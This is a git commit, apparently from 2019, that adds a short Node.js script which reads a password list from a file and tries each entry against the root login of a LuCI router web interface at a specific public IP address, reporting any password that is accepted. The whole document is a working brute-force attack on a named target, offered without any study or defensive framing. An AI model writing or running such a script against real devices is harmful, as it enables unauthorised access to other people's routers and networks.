d10a24241b2b00f7217d4b8f4f788f7cf31854e1
Gico735 <gic0@bk.ru>
2019-03-04 19:54:49 +0300

    add script

---
+++ index.js
@@ -0,0 +1,19 @@
+const fs = require('fs')
+const request = require('request');
+const list = fs.readFileSync('./list.txt', 'UTF-8').split('\n')
+
+list.forEach(pass => {
+  request.get({ url: `http://78.155.207.220:9080/cgi-bin/luci?username=root&password=${pass}` }, ((err, res, body) => {
+    if (err) {
+      console.log(err)
+      return false
+    }
+    if (body.indexOf('Invalid') === -1) {
+      console.log('FOUND: ' + pass)
+      return true
+    } else {
+      console.log(pass)
+      return false
+    }
+  }))
+})
